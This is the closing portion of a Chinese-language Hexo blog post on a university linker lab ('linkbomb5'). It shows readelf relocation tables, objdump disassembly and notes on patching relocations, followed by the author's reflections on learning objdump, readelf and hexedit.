ret    </span><br><span class="line"></span><br><span class="line">Disassembly of section .text.__x86.get_pc_thunk.bx:</span><br><span class="line"></span><br><span class="line"><span class="number">00000000</span> &lt;__x86.get_pc_thunk.bx&gt;:</span><br><span class="line">   <span class="number">0</span>:	<span class="number">8b</span> <span class="number">1</span>c <span class="number">24</span>             	mov    (%esp),%ebx</span><br><span class="line">   <span class="number">3</span>:	c3                   	ret    </span><br></pre></td></tr></table></figure>
<p>主要看 “00 00 00” 和 “ff ff ff” 有没有在 ‘.rel.text’ 表中出现，把出现的标记，没有的可能就是需要修补的，最后进行修改：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">➜  [/home/ywhkkx/ex1.linklab/l5] readelf -r phase5.o             </span><br><span class="line"></span><br><span class="line">重定位节 <span class="string">&#x27;.rel.text&#x27;</span> at offset <span class="number">0x6e8</span> contains <span class="number">27</span> entries:</span><br><span class="line"> 偏移量     信息    类型              符号值      符号名称</span><br><span class="line"><span class="number">00000004</span>  <span class="number">00001</span>d02 R_386_PC32        <span class="number">00000000</span>   __x86.get_pc_thunk.bx</span><br><span class="line"><span class="number">00000009</span>  <span class="number">00001b</span>0a R_386_GOTPC       <span class="number">00000000</span>   _GLOBAL_OFFSET_TABLE_</span><br><span class="line"><span class="number">00000013</span>  <span class="number">00001</span>d02 R_386_PC32        <span class="number">00000000</span>   __x86.get_pc_thunk.bx</span><br><span class="line"><span class="number">00000025</span>  <span class="number">00001b</span>0a R_386_GOTPC       <span class="number">00000000</span>   _GLOBAL_OFFSET_TABLE_</span><br><span class="line"><span class="number">00000038</span>  <span class="number">00001509</span> R_386_GOTOFF      <span class="number">00000000</span>   CmhNnM</span><br><span class="line"><span class="number">0000004</span>c  <span class="number">00001509</span> R_386_GOTOFF      <span class="number">00000000</span>   CmhNnM</span><br><span class="line"><span class="number">0000005</span>d  <span class="number">00001509</span> R_386_GOTOFF      <span class="number">00000000</span>   CmhNnM</span><br><span class="line"><span class="number">0000006f</span>  <span class="number">00001509</span> R_386_GOTOFF      <span class="number">00000000</span>   CmhNnM</span><br><span class="line"><span class="number">0000007</span>e  <span class="number">00001509</span> R_386_GOTOFF      <span class="number">00000000</span>   CmhNnM</span><br><span class="line"><span class="number">00000098</span>  <span class="number">00001</span>d02 R_386_PC32        <span class="number">00000000</span>   __x86.get_pc_thunk.bx</span><br><span class="line"><span class="number">0000009</span>e  <span class="number">00001b</span>0a R_386_GOTPC       <span class="number">00000000</span>   _GLOBAL_OFFSET_TABLE_</span><br><span class="line"><span class="number">000000</span>a7  <span class="number">00001809</span> R_386_GOTOFF      <span class="number">0000000b</span>   CODE</span><br><span class="line"><span class="number">000000</span>ae  <span class="number">00001809</span> R_386_GOTOFF      <span class="number">0000000b</span>   CODE</span><br><span class="line"><span class="number">000000b</span>7  <span class="number">00001809</span> R_386_GOTOFF      <span class="number">0000000b</span>   CODE</span><br><span class="line"><span class="number">000000</span>cc  <span class="number">00001809</span> R_386_GOTOFF      <span class="number">0000000b</span>   CODE</span><br><span class="line"><span class="number">000000</span>ea  <span class="number">00001</span>d02 R_386_PC32        <span class="number">00000000</span>   __x86.get_pc_thunk.bx</span><br><span class="line"><span class="number">000000f</span>0  <span class="number">00001b</span>0a R_386_GOTPC       <span class="number">00000000</span>   _GLOBAL_OFFSET_TABLE_</span><br><span class="line"><span class="number">000000f</span>b  <span class="number">00001f</span>04 R_386_PLT32       <span class="number">00000000</span>   <span class="built_in">strlen</span></span><br><span class="line"><span class="number">00000120</span>  <span class="number">00001609</span> R_386_GOTOFF      <span class="number">00000040</span>   cRvFVR</span><br><span class="line"><span class="number">00000127</span>  <span class="number">00001809</span> R_386_GOTOFF      <span class="number">0000000b</span>   CODE</span><br><span class="line"><span class="number">00000183</span>  <span class="number">00001</span>d02 R_386_PC32        <span class="number">00000000</span>   __x86.get_pc_thunk.bx</span><br><span class="line"><span class="number">00000189</span>  <span class="number">00001b</span>0a R_386_GOTPC       <span class="number">00000000</span>   _GLOBAL_OFFSET_TABLE_</span><br><span class="line"><span class="number">00000193</span>  <span class="number">00001</span>c02 R_386_PC32        <span class="number">00000090</span>   generate_code</span><br><span class="line"><span class="number">0000019f</span>  <span class="number">00001709</span> R_386_GOTOFF      <span class="number">00000000</span>   BUF</span><br><span class="line"><span class="number">000001</span>a5  <span class="number">00001e02</span> R_386_PC32        <span class="number">000000e2</span>   encode</span><br><span class="line"><span class="number">000001b</span>1  <span class="number">00001709</span> R_386_GOTOFF      <span class="number">00000000</span>   BUF</span><br><span class="line"><span class="number">000001b</span>7  <span class="number">00002104</span> R_386_PLT32       <span class="number">00000000</span>   <span class="built_in">puts</span></span><br></pre></td></tr></table></figure>
<p>“偏移量”很好处理，就是“信息”不好选择，我是根据“汇编代码的相似性”进行选择的，最后总算可以输出了（想要完美完成这个实验，必须掌握汇编）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  [/home/ywhkkx/ex1.linklab/l5] ./linkbomb5 </span><br><span class="line">PP$;`;;``;</span><br></pre></td></tr></table></figure>
<p>没有段错误了，但是输出很奇怪（有些地方没有改好）</p>
<hr>
<p><strong>收获</strong></p>
<ul>
<li>以前就对 link 有困惑，做了这个实验感受了一下 link 的过程后，发现自己对 link 的理解更清晰了</li>
<li>学习到了 objdump，readelf，hexedit 等工具的用法</li>
<li>看到了各个节在二进制文件的分布，学会了用“节偏移”和“节内偏移”来寻找需要的数据</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/28/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/28/">28</a><span class="page-number current">29</span><a class="page-number" href="/page/30/">30</a><span class="space">&hellip;</span><a class="page-number" href="/page/34/">34</a><a class="extend next" rel="next" href="/page/30/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="yhellow"
      src="/images/avatar.gif">
  <p class="site-author-name" itemprop="name">yhellow</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">331</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">13</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">170</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 2019 – 
  <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">yhellow</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
    <span title="Symbols count total">4.9m</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="Reading time total">74:46</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
  </div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

  

</body>
</html>
